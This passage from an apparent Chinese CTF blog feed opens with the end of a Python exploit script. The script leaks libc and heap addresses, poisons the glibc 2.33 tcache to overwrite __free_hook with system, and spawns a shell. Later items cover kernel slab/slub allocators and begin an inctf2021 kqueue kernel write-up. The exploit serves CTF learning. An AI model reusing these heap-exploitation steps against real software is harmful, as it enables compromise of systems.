class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;add&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;idx,size,text&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;comment&#34;&gt;#payload = &amp;quot;POST /root/src HTTP/1.1 \r\n\x01&amp;amp;&amp;#123;&amp;#125;&amp;amp;&amp;#123;&amp;#125;&amp;amp;&amp;#123;&amp;#125;&amp;quot;.format(str(idx),str(size),text)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload = &lt;span class=&#34;string&#34;&gt;b&amp;quot;POST /root/src HTTP/1.1 \r\n\x01&amp;amp;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload+= &lt;span class=&#34;built_in&#34;&gt;bytes&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(idx),encoding=&lt;span class=&#34;string&#34;&gt;&amp;#x27;utf-8&amp;#x27;&lt;/span&gt;)+&lt;span class=&#34;string&#34;&gt;b&amp;quot;&amp;amp;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload+= &lt;span class=&#34;built_in&#34;&gt;bytes&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(size),encoding=&lt;span class=&#34;string&#34;&gt;&amp;#x27;utf-8&amp;#x27;&lt;/span&gt;)+&lt;span class=&#34;string&#34;&gt;b&amp;quot;&amp;amp;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload+= text&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Waiting Package&amp;quot;&lt;/span&gt;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;edit&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;idx,text&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload = &lt;span class=&#34;string&#34;&gt;b&amp;quot;POST /root/src HTTP/1.1 \r\n\x02&amp;amp;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload+= &lt;span class=&#34;built_in&#34;&gt;bytes&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(idx),encoding=&lt;span class=&#34;string&#34;&gt;&amp;#x27;utf-8&amp;#x27;&lt;/span&gt;)+&lt;span class=&#34;string&#34;&gt;b&amp;quot;&amp;amp;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload+= text&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Waiting Package&amp;quot;&lt;/span&gt;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;show&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;idx&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload = &lt;span class=&#34;string&#34;&gt;b&amp;quot;POST /root/src HTTP/1.1 \r\n\x03&amp;amp;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload+= &lt;span class=&#34;built_in&#34;&gt;bytes&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(idx),encoding=&lt;span class=&#34;string&#34;&gt;&amp;#x27;utf-8&amp;#x27;&lt;/span&gt;)+&lt;span class=&#34;string&#34;&gt;b&amp;quot;&amp;amp;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Waiting Package&amp;quot;&lt;/span&gt;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;free&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;idx&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload = &lt;span class=&#34;string&#34;&gt;b&amp;quot;POST /root/src HTTP/1.1 \r\n\x04&amp;amp;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload+= &lt;span class=&#34;built_in&#34;&gt;bytes&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(idx),encoding=&lt;span class=&#34;string&#34;&gt;&amp;#x27;utf-8&amp;#x27;&lt;/span&gt;)+&lt;span class=&#34;string&#34;&gt;b&amp;quot;&amp;amp;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Waiting Package&amp;quot;&lt;/span&gt;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gdb.attach(r,&lt;span class=&#34;string&#34;&gt;&amp;#x27;b malloc&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;getadmin()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x420&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x430&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;Length: 6\n&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc = u64(r.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;\x7f&amp;#x27;&lt;/span&gt;).ljust(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;))-&lt;span class=&#34;number&#34;&gt;0x1e0ff0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;malloc_hook = libc+&lt;span class=&#34;number&#34;&gt;0x1e0b90&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free_hook = &lt;span class=&#34;number&#34;&gt;0x1e3e20&lt;/span&gt;+libc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;realloc = libc + &lt;span class=&#34;number&#34;&gt;0x097b20&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system = libc + &lt;span class=&#34;number&#34;&gt;0x4fa60&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;one_gadget = &lt;span class=&#34;number&#34;&gt;0xcafebabedeadbeef&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;libc : &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(libc))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;malloc_hook : &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(malloc_hook))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;free_hook : &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(free_hook))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;realloc : &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(realloc))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#now we need wo leak a chunk address&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;Content-Length: 5\n&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;heap_addr1 = (u64(r.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;quot;\n&amp;quot;&lt;/span&gt;,drop = &lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;).ljust(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;))&amp;lt;&amp;lt;&lt;span class=&#34;number&#34;&gt;12&lt;/span&gt;)+&lt;span class=&#34;number&#34;&gt;0x6d0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;heap_addr1 : &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(heap_addr1))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;heap_addr2 = heap_addr1+&lt;span class=&#34;number&#34;&gt;0x70&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = p64((heap_addr2&amp;gt;&amp;gt;&lt;span class=&#34;number&#34;&gt;12&lt;/span&gt;)^(free_hook-&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;,p64(one_gadget))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;,p64(&lt;span class=&#34;number&#34;&gt;0xaaaaaaaaaaaaaaaa&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;0xbbbbbbbbbbbbbbbb&lt;/span&gt;)+p64(system))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;/bin/sh\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;free(3)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;show(3)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;r.recvuntil(&amp;quot;Content-Length: 5\n&amp;quot;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;heap_addr2 = (u64(r.recvuntil(b&amp;quot;\n&amp;quot;,drop = True).ljust(8,b&amp;#x27;\x00&amp;#x27;))&amp;lt;&amp;lt;12)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;print(&amp;quot;heap_addr2 : &amp;quot;,hex(heap_addr2))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;in glibc 2.33 tcache,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;if we put a new chunk in tcachebin,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;chunk-&amp;gt;fd = ((chunk_user)&amp;gt;&amp;gt;12)^(last_freed_tcachechunk in this bin)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/05/06/slab%E3%80%81slub%E3%80%81slob%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</guid>
            <title>slab、slub、slob学习记录</title>
            <link>http://example.com/2022/05/06/slab%E3%80%81slub%E3%80%81slob%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</link>
            <pubDate>Fri, 06 May 2022 12:47:54 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;kernelpwn的进一步学习后&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#kernelpwn的进一步学习后&#34;&gt;#&lt;/a&gt; kernelpwn 的进一步学习后，&lt;/h1&gt;
&lt;h2 id=&#34;虽然很多东西原理与用户态相似但是终究还是区别很大尤其是在内存的管理在用户态的glibc使用pmalloc进行堆块的管理-但是在内核态我们申请的空间不在仅仅是局限在几十字节的数据而且进程对于空间的申请更加频繁我们需要一个高效简单的管理机制&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#虽然很多东西原理与用户态相似但是终究还是区别很大尤其是在内存的管理在用户态的glibc使用pmalloc进行堆块的管理-但是在内核态我们申请的空间不在仅仅是局限在几十字节的数据而且进程对于空间的申请更加频繁我们需要一个高效简单的管理机制&#34;&gt;#&lt;/a&gt; 虽然很多东西原理与用户态相似，但是终究还是区别很大，尤其是在内存的管理，在用户态的 glibc 使用 pmalloc 进行堆块的管理。但是在内核态，我们申请的空间不在仅仅是局限在几十字节的数据，而且进程对于空间的申请更加频繁，我们需要一个高效简单的管理机制。&lt;/h2&gt;
&lt;p&gt;目前在内核的空间 主要使用的内存管理机制有 slab,slub,slob，其中 slab 是最早的管理机制，但是在 2.6 的 kernel 后被 slub 所代替。目前 slub 也是默认的管理器。而 slob 主要应用在轻量级和移动端的设备中。&lt;/p&gt;
&lt;p&gt;虽然 slab 被 slub 取代，但是二者是升级迭代的关系，slub 一定程度继承了 slab 的机制。上述三者统称为内存分配器。&lt;/p&gt;
&lt;p&gt;几个基本概念：&lt;/p&gt;
&lt;p&gt;1，对比于用户态的程序，与内核态的程序，关于内存的使用。以往我们写的简单程序并没有对物理内存进行主动更改，以堆题为例，我们我们使用的不过是程序分配给我们的虚拟空间，但这个空间真的不存在嘛？不，实际上很多时候我们分配的虚拟空间也好，知识系统的一块提供给我们的内存空间，这个空间是重复使用的，区别于储存空间，比如磁盘。我们使用的空间一般是操作系统的虚拟内存分配的&lt;/p&gt;
&lt;p&gt;32 位下的虚拟内存空间布局如下：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/11/09/qLsr8xECYNpRbAI.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;64 位下的虚拟内存空间布局如下：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/11/09/k8NHa1ljMEfXQbh.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/05/03/inctf2021-kqueue/</guid>
            <title>inctf2021_kqueue</title>
            <link>http://example.com/2022/05/03/inctf2021-kqueue/</link>
            <category>learning</category>
            <pubDate>Tue, 03 May 2022 19:51:43 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;inctf2021-pwn-kqueueheap_overflow&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#inctf2021-pwn-kqueueheap_overflow&#34;&gt;#&lt;/a&gt; Inctf2021 pwn kqueue		heap_overflow&lt;/h1&gt;
&lt;h2 id=&#34;环境以及保护&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#环境以及保护&#34;&gt;#&lt;/a&gt; 环境以及保护&lt;/h2&gt;
&lt;p&gt;首先这个文件系统解压出来重新打包会出现问题，因为按照上一篇博客所讲的，创建 file_system 文件夹后，把文件系统的包丢进去，一旦更改后缀名称就是导致归档失败，无法使用 gunzip 进行解包。手动提取后，使用 find 打包，会导致我们启动的时候，报错我们没有挂载的权限。所以我没有重新打包。&lt;/p&gt;
&lt;p&gt;提取出来的 vmlinux&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;dreamcat@ubuntu:~/Desktop/wykernel/inctf2021_kqueue$ checksec vmlinux&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] &lt;span class=&#34;string&#34;&gt;&amp;#x27;/home/dreamcat/Desktop/wykernel/inctf2021_kqueue/vmlinux&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Arch:     amd64-64-little&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    RELRO:    No RELRO&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Stack:    No canary found&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    NX:       NX disabled&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    PIE:      No PIE (0xffffffff81000000)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    RWX:      Has RWX segments&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;文件系统加载了一个 mod，就是 kqueue&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;dreamcat@ubuntu:~/Desktop/wykernel/inctf2021_kqueue/file_system/root$ checksec --file=kqueue.ko&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] &lt;span class=&#34;string&#34;&gt;&amp;#x27;/home/dreamcat/Desktop/wykernel/inctf2021_kqueue/file_system/root/kqueue.ko&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Arch:     amd64-64-little&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    RELRO:    No RELRO&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Stack:    Canary found&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    NX:       NX enabled&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    PIE:      No PIE (0x0)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;之开启了 canary 以及 NX 保护，（这里的 NX 就不允许我们执行用户态代码）&lt;/p&gt;
&lt;p&gt;chall, 启动脚本&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#!/bin/bash&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;exec&lt;/span&gt; qemu-system-x86_64 \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    -cpu kvm64 \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    -m 512 \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    -nographic \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    -kernel &lt;span class=&#34;string&#34;&gt;&amp;quot;bzImage&amp;quot;&lt;/span&gt; \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    -append &lt;span class=&#34;string&#34;&gt;&amp;quot;console=ttyS0 panic=-1 pti=off kaslr quiet&amp;quot;&lt;/span&gt; \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    -monitor /dev/null \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    -initrd &lt;span class=&#34;string&#34;&gt;&amp;quot;./rootfs.cpio&amp;quot;&lt;/span&gt; \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    -net user \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    -net nic&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;开启了 kaslr 地址随机化&lt;/p&gt;
&lt;p&gt;下面就是我们对题目的逆向&lt;/p&gt;
&lt;h2 id=&#34;前置知识&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#前置知识&#34;&gt;#&lt;/a&gt; 前置知识&lt;/h2&gt;
&lt;p&gt;xlab&amp;amp;slub 分配&lt;/p&gt;
&lt;h2 id=&#34;题目分析&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#题目分析&#34;&gt;#&lt;/a&gt; 题目分析&lt;/h2&gt;
&lt;p&gt;题目加载了 kqueue 的模块，题目直接给出了源码&lt;/p&gt;
